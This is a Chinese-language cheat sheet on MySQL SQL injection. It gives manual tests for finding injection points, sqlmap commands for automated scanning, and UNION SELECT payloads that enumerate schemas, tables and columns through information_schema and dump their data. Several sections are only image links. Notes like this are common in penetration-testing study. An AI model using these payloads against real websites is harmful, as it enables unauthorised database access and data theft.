# MySQL注入
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x01 环境需求
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MySQL数据库(version>=5.0)
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x02 注入函数
![](/assets/49A439B31D3656FE1266C2809C616748.png)
![](/assets/E33220D060B048EAA19A59928F1FFA64.png)
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x03 样例代码
![](/assets/83A2168FAA2CDFB87AF8716FC9F92A3B.png)
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x04 关于内置库
![](/assets/618D4E32E84852266ED812F5595453FF.png)
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x04 注入流程
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.注入点识别:
```
    手工识别:  '   
              [数字型] and 1=1 / and 1=2    
              [字符型] and '1'='1 / and '1'='2
              [易过滤] and 1 like 1 / and 1 like 2
                      or 1=1 / or 1=2,注意参数要提前设置成错误参数
                  
    工具识别:  sqlmap -m filename(filename中保留检测目标)
              sqlmap -r filename(filename中为网站请求数据)
              sqlmap --crawl(sqlmap对目标网站进行爬去，然后依次测试)
              Burpsuite+SQLMap
   
    其他技巧:  出现注入点也可能在登录、搜索、留言一切产生数据交互的地方
              在参数后键入 * ,表明只对这个参数进行测试(BP中)
                
```
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.信息收集:
![](/assets/B37DE04BFA39F1E89C6D4C24BE781008.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.内容获取: 注入语句末尾添加 %23 或者 --+ 进行注释
```sql 
   字段长度: order by
   显示字段: union select null,null,强制报错显示字段
   查库信息: union select database(),version()
   查库: union select group_concat(schema_name) from information_schema.schemata,null
   查表: union select group_concat(table_name) from information_schema.tables where table_schema=database()
   查列: union select group_concat(column_name) from information_schema.columns where table_name='表名'(注1)
   查数据: union select group_concat(null) from 库名.表名
   
   注意: 1.表名加引号，推荐改为十六进制
```







